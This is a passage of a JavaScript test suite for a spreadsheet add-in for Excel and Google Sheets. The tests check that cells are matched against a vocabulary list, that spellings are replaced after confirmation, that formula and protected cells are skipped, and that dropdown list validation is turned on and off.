  assert.deepEqual(locked.host.calls.map(([what, address]) => what + " " + address), ["numberFormat Budget!C3", "values Budget!C3", "numberFormat Budget!C5", "values Budget!C5"], "nothing after the protected cell was run");
  assert.equal(locked.host.grids.Budget[7][2], "sales");
});

test("the Excel bridge sets Excel's list validation from row 2 down with a stop alert, clears it, and refuses a list Excel cannot hold", async () => {
  const { host, bridge } = excelPane({ sheets: { "Orders 2026": ORDERS }, active: { sheet: "Orders 2026", address: "B4" } });
  assert.equal(bridge.SHEET_ROWS, 1048576);
  assert.deepEqual(plain(await bridge.setListValidation({ sheet: "Orders 2026", column: "B" }, ["Acme Logistics GmbH", "Birch & Co"], "Only values from the \"customers\" list.")), { range: "B2:B1048576" });
  const address = "'Orders 2026'!B2:B1048576";
  assert.deepEqual(host.calls.splice(0), [
    ["dataValidation.clear", address],
    ["dataValidation.rule", address, { list: { inCellDropDown: true, source: "Acme Logistics GmbH,Birch & Co" } }],
    ["dataValidation.errorAlert", address, { showAlert: true, style: "Stop", title: NAME, message: "Only values from the \"customers\" list." }],
  ], "what was there is cleared, then the list with a dropdown and an alert that stops the entry");
  assert.deepEqual(Object.keys(host.validations), [address]);
  assert.deepEqual(plain(await bridge.clearListValidation({ sheet: "Orders 2026", column: "B" })), { range: "B2:B1048576" });
  assert.deepEqual(host.calls.splice(0), [["dataValidation.clear", address]]);
  assert.deepEqual(host.validations, {});
  assert.equal(bridge.LIST_SOURCE_MAX, 255);
  assert.equal(bridge.listRefusal(["Acme", "Birch & Co"]), null);
  assert.equal(bridge.listRefusal(["x".repeat(127), "y".repeat(127)]), null, "255 characters with the comma fit");
  assert.equal(bridge.listRefusal(["x".repeat(128), "y".repeat(127)]), "it is 256 characters long with its commas, and Excel takes at most 255 in a validation rule");
  assert.equal(bridge.listRefusal(["Acme", "Birch, Co"]), "the value \"Birch, Co\" holds a comma, and Excel reads the list in a validation rule as values separated by commas");
});

test("in Excel the pane checks a strict column, replaces its aliases after a confirmation and turns list validation on and off through Office.js", async () => {
  const { host, root, bridge, sandbox } = excelPane({ sheets: { Budget: BUDGET }, active: { sheet: "Budget", address: "C4" } });
  sandbox.localStorage.setItem("actleSheetsConfig", CONFIG);
  const pane = bridge.start({ host: host.Office.HostType.Excel });
  await new Promise((resolve) => setImmediate(resolve));
  const panel = strictPanel(root);
  assert.equal(panel.children[0].textContent, 'Only values from the "costCentres" list.');
  await panel.button("Check this column").click();
  assert.equal(pane.ui.message.textContent, "Column C: 5 cells with text checked; 1 match the list, 2 can take the list's spelling, 2 are not in the list.");
  host.grids.Budget[4][2] = "CC-300 Warehouse";
  await panel.button("Replace 2 cells with the list's spelling").click();
  assert.deepEqual(host.calls, [], "nothing before the confirmation");
  await panel.button("Replace 2 cells").click();
  assert.deepEqual(host.calls.splice(0), [["numberFormat", "Budget!C3", [["@"]]], ["values", "Budget!C3", [["CC-200 Sales"]]]]);
  assert.equal(pane.ui.message.textContent, 'Wrote the list\'s spelling into 1 cell of column C. Skipped 1 cell that changed since the check: C5 (now "CC-300 Warehouse").');
  await panel.button("Turn on list validation for this column").click();
  await panel.button("Turn it on").click();
  assert.deepEqual(host.validations["Budget!C2:C1048576"].rule, { list: { inCellDropDown: true, source: "CC-100 Logistics,CC-200 Sales,CC-300 Warehouse" } });
  assert.equal(pane.ui.message.textContent, 'List validation is on for C2:C1048576 on "Budget": a value typed there that is not in the "costCentres" list is refused. Values already there are not checked; Check this column lists them.');
  await panel.button("Remove list validation").click();
  await panel.button("Remove it").click();
  assert.deepEqual(host.validations, {});
  assert.equal(pane.ui.message.textContent, 'Removed the data validation from C2:C1048576 on "Budget".');
});

test("an Excel without ExcelApi 1.8 offers no list validation, and a list longer than Excel takes is refused with the reason", async () => {
  const old = excelPane({ sheets: { Budget: BUDGET }, active: { sheet: "Budget", address: "C4" }, apiSets: { ExcelApi: "1.7" } });
  old.sandbox.localStorage.setItem("actleSheetsConfig", CONFIG);
  old.bridge.start({ host: old.host.Office.HostType.Excel });
  await new Promise((resolve) => setImmediate(resolve));
  const panel = strictPanel(old.root);
  assert.equal(panel.find((n) => n.className === "hint").textContent, "List validation is not offered: this Excel does not have ExcelApi 1.8.");
  assert.equal(panel.button("Turn on list validation for this column"), null);
  assert.equal(panel.button("Remove list validation"), null);
  assert.ok(panel.button("Check this column"), "the check and the replacement need nothing beyond the manifest's ExcelApi 1.7");
  const newer = excelPane({ sheets: { Budget: BUDGET }, active: { sheet: "Budget", address: "C4" }, apiSets: { ExcelApi: "1.10" } });
  newer.sandbox.localStorage.setItem("actleSheetsConfig", CONFIG);
  newer.bridge.start({ host: newer.host.Office.HostType.Excel });
  await new Promise((resolve) => setImmediate(resolve));
  assert.ok(strictPanel(newer.root).button("Turn on list validation for this column"), "1.10 is later than 1.8");
  const long = JSON.stringify({ vocabularies: { codes: Array.from({ length: 30 }, (_, i) => "Code " + String(i).padStart(5, "0")) }, columns: [{ match: { header: "^code" }, vocabulary: "codes", strict: true }] });
  const big = excelPane({ sheets: { Codes: [["Code"], ["Code 00001"]] }, active: { sheet: "Codes", address: "A2" } });
  big.sandbox.localStorage.setItem("actleSheetsConfig", long);
  big.bridge.start({ host: big.host.Office.HostType.Excel });
  await new Promise((resolve) => setImmediate(resolve));
  const refused = strictPanel(big.root);
  assert.equal(refused.find((n) => n.className === "hint").textContent, "List validation is not available for this list: it is 329 characters long with its commas, and Excel takes at most 255 in a validation rule.");
  assert.equal(refused.button("Turn on list validation for this column"), null);
  assert.ok(refused.button("Remove list validation"));
});

test("Code.gs replaces only cells that still hold what the check read, sets the list rule with the documented builder, clears it, and needs a row below the header", () => {
  const spec = { sheets: { Budget: BUDGET }, active: { sheet: "Budget", row: 4, col: 3 } };
  const { fake, gs } = appsScript(spec);
  fake.grids.Budget[4][2] = "CC-300 Warehouse";
  assert.deepEqual(plain(gs.replaceValues({ sheet: "Budget", column: "C" }, [{ row: 3, from: "sales", to: "CC-200 Sales" }, { row: 5, from: "cc-300  warehouse", to: "CC-300 Warehouse" }])), { written: [3], skipped: [{ row: 5, text: "CC-300 Warehouse" }], computed: [] });
  assert.deepEqual(fake.calls.splice(0), [["setNumberFormat", "C3", "@"], ["setValue", "C3", "CC-200 Sales"]]);
  assert.deepEqual(plain(gs.setListValidation({ sheet: "Budget", column: "C" }, ["CC-100 Logistics", "CC-200 Sales"])), { range: "C2:C1000" }, "to the sheet's last row");
  assert.deepEqual(fake.calls.splice(0), [["setDataValidation", "C2:C1000", { criteria: "VALUE_IN_LIST", values: [["CC-100 Logistics", "CC-200 Sales"], true], allowInvalid: false }]], "a dropdown, and other values refused");
  assert.equal(fake.validations.Budget["C2:C1000"].getAllowInvalid(), false);
  assert.deepEqual(plain(gs.clearListValidation({ sheet: "Budget", column: "C" })), { range: "C2:C1000" });
  assert.deepEqual(fake.calls.splice(0), [["clearDataValidations", "C2:C1000"]]);
  assert.deepEqual(fake.validations.Budget, {});
  const short = appsScript({ sheets: { One: [["Code"]] }, active: { sheet: "One", row: 1, col: 1 }, maxRows: { One: 1 } });
  assert.throws(() => short.gs.setListValidation({ sheet: "One", column: "A" }, ["x"]), /the sheet has no rows below the header/);
  assert.throws(() => gs.setListValidation({ sheet: "Gone", column: "A" }, ["x"]), /sheet Gone is gone/);
});

test("Code.gs never overwrites a cell that holds a formula, and a write that throws stops the replacement with what was written before it", () => {
  const { fake, gs } = appsScript({ sheets: { Budget: COMPUTED }, active: { sheet: "Budget", row: 4, col: 3 }, formulas: { Budget: { C3: "=LOWER(B9)" } } });
  assert.deepEqual(plain(gs.replaceValues({ sheet: "Budget", column: "C" }, COMPUTED_CHANGES)), { written: [5, 7, 8], skipped: [], computed: [3] });
  assert.equal(fake.calls.some(([, a1]) => a1 === "C3"), false, "nothing is written into C3");
  assert.equal(fake.formulas.Budget.get("C3"), "=LOWER(B9)", "C3 keeps its formula");
  const locked = appsScript({ sheets: { Budget: COMPUTED }, active: { sheet: "Budget", row: 4, col: 3 }, protect: { Budget: ["C7"] } });
  assert.deepEqual(plain(locked.gs.replaceValues({ sheet: "Budget", column: "C" }, COMPUTED_CHANGES)), { written: [3, 5], skipped: [], computed: [], failed: { row: 7, message: "C7 is protected" } });
  assert.equal(locked.fake.grids.Budget[7][2], "sales", "nothing after the cell that threw is written");
});

test("the sidebar checks a strict column and replaces and validates through google.script.run; a rule the spreadsheet refuses is reported", async () => {
  const spec = { sheets: { Budget: BUDGET }, active: { sheet: "Budget", row: 4, col: 3 } };
  const { fake, gs } = appsScript(spec);
  const server = fakeGoogleRun({ getActiveCellContext: gs.getActiveCellContext, replaceValues: gs.replaceValues, setListValidation: gs.setListValidation, clearListValidation: gs.clearListValidation, loadConfig: gs.loadConfig, saveConfig: gs.saveConfig });
  const root = new Node("div");
  const globals = { google: { script: { run: server.run } }, document: fakeDocument({ pane: root }), localStorage: storageOf({ actleSheetsConfig: CONFIG }), ActleSheets: sheets, setInterval: () => {} };
  const sandbox = sandboxed(path.join(ADDIN, "pane.js"), globals);
  const html = fs.readFileSync(path.join(ADDIN, "apps-script", "Sidebar.html"), "utf8");
  vm.runInContext(/<script>([\s\S]*?)<\/script>/.exec(html)[1], sandbox, { filename: "Sidebar.html" });
  const settle = () => new Promise((resolve) => setImmediate(resolve));
  await settle();
  const panel = strictPanel(root);
  const message = () => root.find((n) => n.className === "message").textContent;
  await panel.button("Check this column").click();
  assert.equal(message(), "Column C: 5 cells with text checked; 1 match the list, 2 can take the list's spelling, 2 are not in the list.");
  await panel.button("Replace 2 cells with the list's spelling").click();
  await panel.button("Replace 2 cells").click();
  await settle();
  assert.deepEqual(server.calls.filter(([name]) => name === "replaceValues"), [["replaceValues", { sheet: "Budget", column: "C" }, [{ row: 3, from: "sales", to: "CC-200 Sales" }, { row: 5, from: "cc-300  warehouse", to: "CC-300 Warehouse" }]]]);
  assert.deepEqual([fake.grids.Budget[2][2], fake.grids.Budget[4][2]], ["CC-200 Sales", "CC-300 Warehouse"]);
  assert.equal(message(), "Wrote the list's spelling into 2 cells of column C.");
  await panel.button("Turn on list validation for this column").click();
  await panel.button("Turn it on").click();
  assert.deepEqual(server.calls.filter(([name]) => name === "setListValidation"), [["setListValidation", { sheet: "Budget", column: "C" }, ["CC-100 Logistics", "CC-200 Sales", "CC-300 Warehouse"]]]);
  assert.equal(message(), 'List validation is on for C2:C1000 on "Budget": a value typed there that is not in the "costCentres" list is refused. Values already there are not checked; Check this column lists them.');
  await panel.button("Remove list validation").click();
  await panel.button("Remove it").click();
  assert.deepEqual(server.calls.filter(([name]) => name === "clearListValidation"), [["clearListValidation", { sheet: "Budget", column: "C" }]]);
  spec.refuseRule = "The data validation rule is not valid.";
  await panel.button("Turn on list validation for this column").click();
  await panel.button("Turn it on").click();
  assert.equal(message(), "Could not turn on list validation for column C: The data validation rule is not valid.");
  assert.deepEqual(fake.validations.Budget, {});
});
